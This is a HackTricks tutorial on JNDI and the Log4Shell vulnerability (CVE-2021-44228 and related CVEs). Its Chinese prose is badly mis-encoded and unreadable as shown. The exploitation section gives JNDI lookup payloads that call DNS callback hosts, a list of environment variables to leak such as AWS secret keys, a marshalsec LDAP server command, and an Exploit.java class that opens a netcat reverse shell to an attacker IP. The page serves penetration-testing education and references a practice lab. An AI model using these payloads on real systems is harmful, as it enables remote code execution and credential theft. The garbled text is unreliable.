# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

è‡ªä¸Šä¸–çºª90å¹´ä»£æœ«é›†æˆåˆ°Javaä¸­çš„JNDIä½œä¸ºç›®å½•æœåŠ¡ï¼Œä½¿Javaç¨‹åºèƒ½å¤Ÿé€šè¿‡å‘½åç³»ç»Ÿå®šä½æ•°æ®æˆ–å¯¹è±¡ã€‚å®ƒé€šè¿‡æœåŠ¡æä¾›è€…æ¥å£ï¼ˆSPIsï¼‰æ”¯æŒå„ç§ç›®å½•æœåŠ¡ï¼Œå…è®¸ä»ä¸åŒç³»ç»Ÿï¼ˆåŒ…æ‹¬è¿œç¨‹Javaå¯¹è±¡ï¼‰æ£€ç´¢æ•°æ®ã€‚å¸¸è§çš„SPIåŒ…æ‹¬CORBA COSã€Java RMI Registryå’ŒLDAPã€‚

### JNDIå‘½åå¼•ç”¨

Javaå¯¹è±¡å¯ä»¥ä½¿ç”¨JNDIå‘½åå¼•ç”¨å­˜å‚¨å’Œæ£€ç´¢ï¼Œæœ‰ä¸¤ç§å½¢å¼ï¼š

* **å¼•ç”¨åœ°å€**ï¼šæŒ‡å®šå¯¹è±¡çš„ä½ç½®ï¼ˆä¾‹å¦‚ï¼Œ_rmi://server/ref_ï¼‰ï¼Œå…è®¸ç›´æ¥ä»æŒ‡å®šåœ°å€æ£€ç´¢ã€‚
* **è¿œç¨‹å·¥å‚**ï¼šå¼•ç”¨è¿œç¨‹å·¥å‚ç±»ã€‚è®¿é—®æ—¶ï¼Œè¯¥ç±»å°†ä»è¿œç¨‹ä½ç½®ä¸‹è½½å¹¶å®ä¾‹åŒ–ã€‚

ç„¶è€Œï¼Œè¿™ç§æœºåˆ¶å¯èƒ½ä¼šè¢«åˆ©ç”¨ï¼Œæ½œåœ¨åœ°å¯¼è‡´åŠ è½½å’Œæ‰§è¡Œä»»æ„ä»£ç ã€‚ä½œä¸ºå¯¹ç­–ï¼š

* **RMI**ï¼šä»JDK 7u21èµ·ï¼Œé»˜è®¤ä¸º`java.rmi.server.useCodeabseOnly = true`ï¼Œé™åˆ¶è¿œç¨‹å¯¹è±¡åŠ è½½ã€‚å®‰å…¨ç®¡ç†å™¨è¿›ä¸€æ­¥é™åˆ¶å¯åŠ è½½çš„å†…å®¹ã€‚
* **LDAP**ï¼šä»JDK 6u141ã€7u131ã€8u121èµ·ï¼Œé»˜è®¤ä¸º`com.sun.jndi.ldap.object.trustURLCodebase = false`ï¼Œé˜»æ­¢æ‰§è¡Œè¿œç¨‹åŠ è½½çš„Javaå¯¹è±¡ã€‚å¦‚æœè®¾ç½®ä¸º`true`ï¼Œåˆ™å¯ä»¥åœ¨æ²¡æœ‰å®‰å…¨ç®¡ç†å™¨ç›‘ç£çš„æƒ…å†µä¸‹æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚
* **CORBA**ï¼šæ²¡æœ‰ç‰¹å®šçš„å±æ€§ï¼Œä½†å®‰å…¨ç®¡ç†å™¨å§‹ç»ˆå¤„äºæ´»åŠ¨çŠ¶æ€ã€‚

ç„¶è€Œï¼Œè´Ÿè´£è§£æJNDIé“¾æ¥çš„**å‘½åç®¡ç†å™¨**ç¼ºä¹å†…ç½®å®‰å…¨æœºåˆ¶ï¼Œå¯èƒ½å…è®¸ä»ä»»ä½•æ¥æºæ£€ç´¢å¯¹è±¡ã€‚è¿™ä¼šå¸¦æ¥é£é™©ï¼Œå› ä¸ºå¯ä»¥ç»•è¿‡RMIã€LDAPå’ŒCORBAçš„ä¿æŠ¤ï¼Œå¯¼è‡´åŠ è½½ä»»æ„Javaå¯¹è±¡æˆ–åˆ©ç”¨ç°æœ‰åº”ç”¨ç¨‹åºç»„ä»¶ï¼ˆå°å·¥å…·ï¼‰è¿è¡Œæ¶æ„ä»£ç ã€‚

å¯åˆ©ç”¨çš„URLç¤ºä¾‹åŒ…æ‹¬ï¼š

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

å°½ç®¡æœ‰ä¿æŠ¤æªæ–½ï¼Œæ¼æ´ä»ç„¶å­˜åœ¨ï¼Œä¸»è¦æ˜¯ç”±äºç¼ºä¹å¯¹ä»ä¸å—ä¿¡ä»»æ¥æºåŠ è½½JNDIçš„ä¿æŠ¤ä»¥åŠç»•è¿‡ç°æœ‰ä¿æŠ¤çš„å¯èƒ½æ€§ã€‚

### JNDIç¤ºä¾‹

![](<../../.gitbook/assets/image (655) (1) (1).png>)

å³ä½¿æ‚¨è®¾ç½®äº†**`PROVIDER_URL`**ï¼Œæ‚¨ä¹Ÿå¯ä»¥åœ¨æŸ¥æ‰¾ä¸­æŒ‡å®šä¸åŒçš„URLå¹¶è®¿é—®ï¼š`ctx.lookup("<attacker-controlled-url>")`ï¼Œè¿™å°±æ˜¯æ”»å‡»è€…å°†æ»¥ç”¨ä»¥ä»å…¶æ§åˆ¶çš„ç³»ç»ŸåŠ è½½ä»»æ„å¯¹è±¡çš„æ–¹å¼ã€‚

### CORBAæ¦‚è¿°

CORBAï¼ˆé€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„ï¼‰ä½¿ç”¨**å¯äº’æ“ä½œå¯¹è±¡å¼•ç”¨ï¼ˆIORï¼‰**æ¥å”¯ä¸€æ ‡è¯†è¿œç¨‹å¯¹è±¡ã€‚æ­¤å¼•ç”¨åŒ…æ‹¬å…³é”®ä¿¡æ¯ï¼Œå¦‚ï¼š

* **ç±»å‹ID**ï¼šæ¥å£çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚
* **ä»£ç åº“**ï¼šç”¨äºè·å–å­˜æ ¹ç±»çš„URLã€‚

å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒCORBAæœ¬èº«å¹¶ä¸æ˜“å—æ”»å‡»ã€‚ç¡®ä¿å®‰å…¨é€šå¸¸æ¶‰åŠï¼š

* å®‰è£…**å®‰å…¨ç®¡ç†å™¨**ã€‚
* é…ç½®å®‰å…¨ç®¡ç†å™¨ä»¥å…è®¸è¿æ¥åˆ°æ½œåœ¨æ¶æ„ä»£ç åº“ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°ï¼š
* Socketæƒé™ï¼Œä¾‹å¦‚ï¼Œ`permissions java.net.SocketPermission "*:1098-1099", "connect";`ã€‚
* æ–‡ä»¶è¯»å–æƒé™ï¼Œå¯ä»¥æ˜¯å…¨å±€çš„ï¼ˆ`permission java.io.FilePermission "<<ALL FILES>>", "read";`ï¼‰æˆ–é’ˆå¯¹å¯èƒ½æ”¾ç½®æ¶æ„æ–‡ä»¶çš„ç‰¹å®šç›®å½•ã€‚

ç„¶è€Œï¼Œä¸€äº›ä¾›åº”å•†æ”¿ç­–å¯èƒ½å®½æ¾ï¼Œå…è®¸é»˜è®¤æƒ…å†µä¸‹è¿›è¡Œè¿™äº›è¿æ¥ã€‚

### RMIä¸Šä¸‹æ–‡

å¯¹äºRMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰ï¼Œæƒ…å†µç•¥æœ‰ä¸åŒã€‚ä¸CORBAä¸€æ ·ï¼Œé»˜è®¤æƒ…å†µä¸‹é™åˆ¶äº†ä»»æ„ç±»çš„ä¸‹è½½ã€‚è¦åˆ©ç”¨RMIï¼Œé€šå¸¸éœ€è¦ç»•è¿‡å®‰å…¨ç®¡ç†å™¨ï¼Œè¿™ä¹Ÿé€‚ç”¨äºCORBAã€‚

### LDAP

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åŒºåˆ†æœç´¢å’ŒæŸ¥æ‰¾ã€‚\
**æœç´¢**å°†ä½¿ç”¨ç±»ä¼¼`ldap://localhost:389/o=JNDITutorial`çš„URLæ¥æŸ¥æ‰¾LDAPæœåŠ¡å™¨ä¸­çš„JNDITutorialå¯¹è±¡å¹¶**æ£€ç´¢å…¶å±æ€§**ã€‚\
**æŸ¥æ‰¾**ç”¨äº**å‘½åæœåŠ¡**ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦è·å–**ç»‘å®šåˆ°åç§°çš„ä»»ä½•å†…å®¹**ã€‚

å¦‚æœLDAPæœç´¢ä½¿ç”¨äº†`SearchControls.setReturningObjFlag()`å¹¶è®¾ç½®ä¸º`true`ï¼Œåˆ™è¿”å›çš„å¯¹è±¡å°†è¢«é‡å»ºã€‚

å› æ­¤ï¼Œæœ‰å‡ ç§æ”»å‡»è¿™äº›é€‰é¡¹çš„æ–¹æ³•ã€‚\
**æ”»å‡»è€…å¯ä»¥åœ¨LDAPè®°å½•ä¸­æ¤å…¥æœ‰æ•ˆè´Ÿè½½**ï¼Œè¿™äº›æœ‰æ•ˆè´Ÿè½½å°†åœ¨æ”¶é›†å®ƒä»¬çš„ç³»ç»Ÿä¸­æ‰§è¡Œï¼ˆå¦‚æœæ‚¨å¯ä»¥è®¿é—®LDAPæœåŠ¡å™¨ï¼Œåˆ™éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥**å±å®³æ•°åå°æœºå™¨**ï¼‰ã€‚å¦ä¸€ç§åˆ©ç”¨æ–¹æ³•æ˜¯åœ¨LDAPæœç´¢ä¸­æ‰§è¡Œ**ä¸­é—´äººæ”»å‡»**ï¼Œä¾‹å¦‚ã€‚

å¦‚æœæ‚¨å¯ä»¥**è®©åº”ç”¨ç¨‹åºè§£æJNDI LDAP URL**ï¼Œåˆ™å¯ä»¥æ§åˆ¶å°†è¢«æœç´¢çš„LDAPï¼Œå¹¶ä¸”å¯ä»¥å‘é€å›åˆ©ç”¨ï¼ˆlog4shellï¼‰ã€‚

#### ååºåˆ—åŒ–åˆ©ç”¨

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**åˆ©ç”¨è¢«åºåˆ—åŒ–**ï¼Œå°†è¿›è¡Œååºåˆ—åŒ–ã€‚\
å¦‚æœ`trustURLCodebase`ä¸º`true`ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä»£ç åº“ä¸­æä¾›è‡ªå·±çš„ç±»ï¼›å¦‚æœä¸æ˜¯ï¼Œåˆ™éœ€è¦åœ¨ç±»è·¯å¾„ä¸­æ»¥ç”¨å°å·¥å…·ã€‚

#### JNDIå¼•ç”¨åˆ©ç”¨

ä½¿ç”¨**JavaFactoryå¼•ç”¨**æ›´å®¹æ˜“æ”»å‡»æ­¤LDAPï¼š

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Log4Shellæ¼æ´

è¯¥æ¼æ´å‡ºç°åœ¨Log4jä¸­ï¼Œå› ä¸ºå®ƒæ”¯æŒä¸€ç§[**ç‰¹æ®Šè¯­æ³•**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)ï¼Œå½¢å¼ä¸º`${prefix:name}`ï¼Œå…¶ä¸­`prefix`æ˜¯å¤šç§ä¸åŒ[**æŸ¥æ‰¾**](https://logging.apache.org/log4j/2.x/manual/lookups.html)ä¹‹ä¸€ï¼Œ`name`åº”è¯¥è¢«è¯„ä¼°ã€‚ä¾‹å¦‚ï¼Œ`${java:version}`æ˜¯å½“å‰è¿è¡Œçš„Javaç‰ˆæœ¬ã€‚

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313)å¼•å…¥äº†`jndi`æŸ¥æ‰¾åŠŸèƒ½ã€‚æ­¤åŠŸèƒ½é€šè¿‡JNDIå…è®¸æ£€ç´¢å˜é‡ã€‚é€šå¸¸ï¼Œå¯†é’¥ä¼šè‡ªåŠ¨æ·»åŠ å‰ç¼€`java:comp/env/`ã€‚ä½†æ˜¯ï¼Œå¦‚æœå¯†é’¥æœ¬èº«åŒ…å«**â€œ:â€**ï¼Œåˆ™ä¸ä¼šåº”ç”¨æ­¤é»˜è®¤å‰ç¼€ã€‚

å¦‚æœå¯†é’¥ä¸­æœ‰**â€œ:â€**ï¼Œä¾‹å¦‚`${jndi:ldap://example.com/a}`ï¼Œåˆ™æ²¡æœ‰å‰ç¼€ï¼Œ**LDAPæœåŠ¡å™¨å°†æŸ¥è¯¢å¯¹è±¡**ã€‚è¿™äº›æŸ¥æ‰¾å¯ä»¥åœ¨Log4jçš„é…ç½®ä»¥åŠè®°å½•è¡Œä¸­ä½¿ç”¨ã€‚

å› æ­¤ï¼Œè¦å®ç°RCEï¼Œåªéœ€è¦ä¸€ä¸ª**å—ç”¨æˆ·æ§åˆ¶çš„ä¿¡æ¯**ï¼Œä»¥åŠä¸€ä¸ªæ˜“å—æ”»å‡»çš„Log4jç‰ˆæœ¬ã€‚ç”±äºè¿™æ˜¯Javaåº”ç”¨ç¨‹åºå¹¿æ³›ä½¿ç”¨çš„ç”¨äºè®°å½•ä¿¡æ¯çš„åº“ï¼ˆåŒ…æ‹¬é¢å‘äº’è”ç½‘çš„åº”ç”¨ç¨‹åºï¼‰ï¼Œé€šå¸¸ä¼šæœ‰log4jè®°å½•ä¾‹å¦‚æ¥æ”¶çš„HTTPæ ‡å¤´ï¼Œå¦‚User-Agentã€‚ä½†æ˜¯ï¼Œlog4j**ä¸ä»…ç”¨äºè®°å½•HTTPä¿¡æ¯ï¼Œè¿˜ç”¨äºè®°å½•ä»»ä½•è¾“å…¥**å’Œå¼€å‘äººå‘˜æŒ‡å®šçš„æ•°æ®ã€‚
## Log4Shellç›¸å…³CVEæ¦‚è¿°

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[å…³é”®]**

è¿™ä¸ªæ¼æ´æ˜¯`log4j-core`ç»„ä»¶ä¸­çš„å…³é”®**æœªå—ä¿¡ä»»çš„ååºåˆ—åŒ–æ¼æ´**ï¼Œå½±å“ç‰ˆæœ¬ä»2.0-beta9åˆ°2.14.1ã€‚å®ƒå…è®¸**è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿæ¥ç®¡ç³»ç»Ÿã€‚è¯¥é—®é¢˜ç”±é˜¿é‡Œå·´å·´äº‘å®‰å…¨å›¢é˜Ÿçš„é™ˆå…†å†›æŠ¥å‘Šï¼Œå¹¶å½±å“å„ç§Apacheæ¡†æ¶ã€‚ç‰ˆæœ¬2.15.0ä¸­çš„åˆå§‹ä¿®å¤æ˜¯ä¸å®Œæ•´çš„ã€‚æœ‰ç”¨äºé˜²å¾¡çš„Sigmaè§„åˆ™å¯ç”¨ï¼ˆ[è§„åˆ™1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml)ï¼Œ[è§„åˆ™2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)ï¼‰ã€‚

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[å…³é”®]**

æœ€åˆè¯„çº§è¾ƒä½ï¼Œä½†åæ¥å‡çº§ä¸ºå…³é”®ï¼Œè¿™ä¸ªCVEæ˜¯ç”±äºå¯¹CVE-2021-44228åœ¨2.15.0ä¸­çš„ä¿®å¤ä¸å®Œæ•´è€Œå¯¼è‡´çš„**æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰**æ¼æ´ã€‚å®ƒå½±å“éé»˜è®¤é…ç½®ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒåˆ¶ä½œçš„è½½è·å‘èµ·DoSæ”»å‡»ã€‚ä¸€æ¡[tweet](https://twitter.com/marcioalm/status/1471740771581652995)å±•ç¤ºäº†ä¸€ç§ç»•è¿‡æ–¹æ³•ã€‚è¯¥é—®é¢˜åœ¨ç‰ˆæœ¬2.16.0å’Œ2.12.2ä¸­å¾—åˆ°è§£å†³ï¼Œæ–¹æ³•æ˜¯åˆ é™¤æ¶ˆæ¯æŸ¥æ‰¾æ¨¡å¼å¹¶é»˜è®¤ç¦ç”¨JNDIã€‚

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[é«˜]**

å½±å“éé»˜è®¤é…ç½®ä¸­ä½¿ç”¨`JMSAppender`çš„**Log4j 1.xç‰ˆæœ¬**ï¼Œè¿™ä¸ªCVEæ˜¯ä¸€ä¸ªæœªå—ä¿¡ä»»çš„ååºåˆ—åŒ–æ¼æ´ã€‚1.xåˆ†æ”¯æ²¡æœ‰å¯ç”¨çš„ä¿®å¤ï¼Œè¯¥åˆ†æ”¯å·²ç»ç»ˆæ­¢ç”Ÿå‘½å‘¨æœŸï¼Œå»ºè®®å‡çº§åˆ°`log4j-core 2.17.0`ã€‚

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[ä¸­ç­‰]**

è¿™ä¸ªæ¼æ´å½±å“**Logbackæ—¥å¿—æ¡†æ¶**ï¼Œè¿™æ˜¯Log4j 1.xçš„åç»§è€…ã€‚æ­¤å‰è®¤ä¸ºæ˜¯å®‰å…¨çš„æ¡†æ¶è¢«å‘ç°å­˜åœ¨æ¼æ´ï¼Œæ–°ç‰ˆæœ¬ï¼ˆ1.3.0-alpha11å’Œ1.2.9ï¼‰å·²å‘å¸ƒä»¥è§£å†³æ­¤é—®é¢˜ã€‚

### **CVE-2021-45105** **\[é«˜]**

Log4j 2.16.0å­˜åœ¨ä¸€ä¸ªDoSæ¼æ´ï¼Œä¿ƒä½¿å‘å¸ƒ`log4j 2.17.0`æ¥ä¿®å¤è¯¥CVEã€‚æ›´å¤šè¯¦ç»†ä¿¡æ¯è¯·å‚é˜…BleepingComputerçš„[æŠ¥å‘Š](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/)ã€‚

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

å½±å“log4jç‰ˆæœ¬2.17ï¼Œè¿™ä¸ªCVEè¦æ±‚æ”»å‡»è€…æ§åˆ¶log4jçš„é…ç½®æ–‡ä»¶ã€‚å®ƒæ¶‰åŠé€šè¿‡é…ç½®çš„JDBCAppenderè¿›è¡Œæ½œåœ¨çš„ä»»æ„ä»£ç æ‰§è¡Œã€‚æ›´å¤šè¯¦ç»†ä¿¡æ¯è¯·å‚é˜…[Checkmarxåšå®¢æ–‡ç« ](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)ã€‚

## Log4Shellåˆ©ç”¨

### å‘ç°

å¦‚æœæ²¡æœ‰å—ä¿æŠ¤ï¼Œè¿™ä¸ªæ¼æ´å¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œå› ä¸ºå®ƒä¼šå‘æ‚¨åœ¨è´Ÿè½½ä¸­æŒ‡å®šçš„åœ°å€å‘é€è‡³å°‘ä¸€ä¸ª**DNSè¯·æ±‚**ã€‚å› æ­¤ï¼Œåƒä»¥ä¸‹è¿™æ ·çš„è´Ÿè½½ï¼š

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}`ï¼ˆä½¿ç”¨[canarytokens.com](https://canarytokens.org/generate)ï¼‰
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}`ï¼ˆä½¿ç”¨[interactsh](https://github.com/projectdiscovery/interactsh)ï¼‰
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}`ï¼ˆä½¿ç”¨Burp Suiteï¼‰
* `${jndi:ldap://2j4ayo.dnslog.cn}`ï¼ˆä½¿ç”¨[dnslog](http://dnslog.cn)ï¼‰
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}`ï¼ˆä½¿ç”¨[huntress](https://log4shell.huntress.com)ï¼‰

è¯·æ³¨æ„ï¼Œ**å³ä½¿æ”¶åˆ°DNSè¯·æ±‚ï¼Œä¹Ÿä¸æ„å‘³ç€åº”ç”¨ç¨‹åºæ˜¯å¯åˆ©ç”¨çš„**ï¼ˆç”šè‡³æ˜¯æœ‰æ¼æ´çš„ï¼‰ï¼Œæ‚¨éœ€è¦å°è¯•åˆ©ç”¨å®ƒã€‚

{% hint style="info" %}
è¯·è®°ä½ï¼Œè¦**åˆ©ç”¨ç‰ˆæœ¬2.15**ï¼Œæ‚¨éœ€è¦æ·»åŠ **æœ¬åœ°ä¸»æœºæ£€æŸ¥ç»•è¿‡**ï¼š${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **æœ¬åœ°å‘ç°**

æœç´¢**æœ¬åœ°æ˜“å—æ”»å‡»ç‰ˆæœ¬**çš„åº“ï¼š
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **éªŒè¯**

ä¹‹å‰åˆ—å‡ºçš„ä¸€äº›å¹³å°å°†å…è®¸æ‚¨æ’å…¥ä¸€äº›å˜é‡æ•°æ®ï¼Œå½“è¯·æ±‚æ—¶å°†è¢«è®°å½•ã€‚\
è¿™å¯¹ä¸¤ä»¶äº‹æƒ…éå¸¸æœ‰ç”¨ï¼š

* **éªŒè¯**æ¼æ´
* æ»¥ç”¨æ¼æ´**çªƒå–ä¿¡æ¯**

ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥è¯·æ±‚ç±»ä¼¼äºï¼š\
æˆ–è€…åƒ`${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`**ï¼Œå¦‚æœæ”¶åˆ°å…·æœ‰ç¯å¢ƒå˜é‡å€¼çš„**DNSè¯·æ±‚**ï¼Œåˆ™çŸ¥é“åº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ã€‚

æ‚¨å¯ä»¥å°è¯•**æ³„éœ²**çš„å…¶ä»–ä¿¡æ¯ï¼š
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE ä¿¡æ¯

{% hint style="info" %}
åœ¨ JDK ç‰ˆæœ¬é«˜äº 6u141ã€7u131 æˆ– 8u121 çš„ä¸»æœºä¸Šï¼Œå·²ç»é’ˆå¯¹ LDAP ç±»åŠ è½½æ”»å‡»å‘é‡è¿›è¡Œäº†ä¿æŠ¤ã€‚è¿™æ˜¯å› ä¸ºé»˜è®¤æƒ…å†µä¸‹ç¦ç”¨äº† `com.sun.jndi.ldap.object.trustURLCodebase`ï¼Œé˜»æ­¢äº† JNDI é€šè¿‡ LDAP åŠ è½½è¿œç¨‹ä»£ç åº“ã€‚ç„¶è€Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™äº›ç‰ˆæœ¬**ä»ç„¶æ— æ³•é˜²å¾¡ååºåˆ—åŒ–æ”»å‡»å‘é‡**ã€‚

å¯¹äºè¯•å›¾åˆ©ç”¨è¿™äº›è¾ƒé«˜ JDK ç‰ˆæœ¬çš„æ”»å‡»è€…ï¼Œæœ‰å¿…è¦åˆ©ç”¨ Java åº”ç”¨ç¨‹åºä¸­çš„**å—ä¿¡ä»»å°å·¥å…·**ã€‚è¯¸å¦‚ ysoserial æˆ– JNDIExploit çš„å·¥å…·ç»å¸¸ç”¨äºæ­¤ç›®çš„ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œåˆ©ç”¨è¾ƒä½ JDK ç‰ˆæœ¬ç›¸å¯¹æ›´å®¹æ˜“ï¼Œå› ä¸ºè¿™äº›ç‰ˆæœ¬å¯ä»¥è¢«æ“çºµä»¥åŠ è½½å’Œæ‰§è¡Œä»»æ„ç±»ã€‚

è¦äº†è§£**æ›´å¤šä¿¡æ¯**ï¼ˆ_å¦‚ RMI å’Œ CORBA å‘é‡çš„é™åˆ¶_ï¼‰ï¼Œè¯·æŸ¥çœ‹å‰é¢çš„ JNDI å‘½åå‚è€ƒéƒ¨åˆ†æˆ–[https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - ä½¿ç”¨è‡ªå®šä¹‰æœ‰æ•ˆè½½è·çš„ Marshalsec

æ‚¨å¯ä»¥åœ¨ **THM box** ä¸­æµ‹è¯•è¿™ä¸ªï¼š[**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

ä½¿ç”¨å·¥å…· [**marshalsec**](https://github.com/mbechler/marshalsec)ï¼ˆjar ç‰ˆæœ¬å¯åœ¨[**è¿™é‡Œ**](https://github.com/RandomRobbieBF/marshalsec-jar)æ‰¾åˆ°ï¼‰ã€‚è¿™ç§æ–¹æ³•å»ºç«‹äº†ä¸€ä¸ª LDAP å¼•èæœåŠ¡å™¨ï¼Œå°†è¿æ¥é‡å®šå‘åˆ°ä¸€ä¸ªæ¬¡è¦çš„ HTTP æœåŠ¡å™¨ï¼Œå…¶ä¸­å°†æ‰˜ç®¡åˆ©ç”¨ç¨‹åºï¼š
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
ä¸ºäº†ä¿ƒä½¿ç›®æ ‡åŠ è½½ä¸€ä¸ªåå‘ shell ä»£ç ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º `Exploit.java` çš„ Java æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†Javaæ–‡ä»¶ç¼–è¯‘ä¸ºç±»æ–‡ä»¶ï¼š`javac Exploit.java -source 8 -target 8`ã€‚æ¥ä¸‹æ¥ï¼Œåœ¨åŒ…å«ç±»æ–‡ä»¶çš„ç›®å½•ä¸­å¯åŠ¨**HTTPæœåŠ¡å™¨**ï¼š`python3 -m http.server`ã€‚ç¡®ä¿**marshalsec LDAPæœåŠ¡å™¨**å¼•ç”¨æ­¤HTTPæœåŠ¡å™¨ã€‚

é€šè¿‡å‘é€ç±»ä¼¼ä»¥ä¸‹è´Ÿè½½çš„æœ‰æ•ˆè´Ÿè½½æ¥è§¦å‘å¯¹æ˜“å—æ”»å‡»çš„WebæœåŠ¡å™¨ä¸Šçš„exploitç±»çš„æ‰§è¡Œï¼š
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
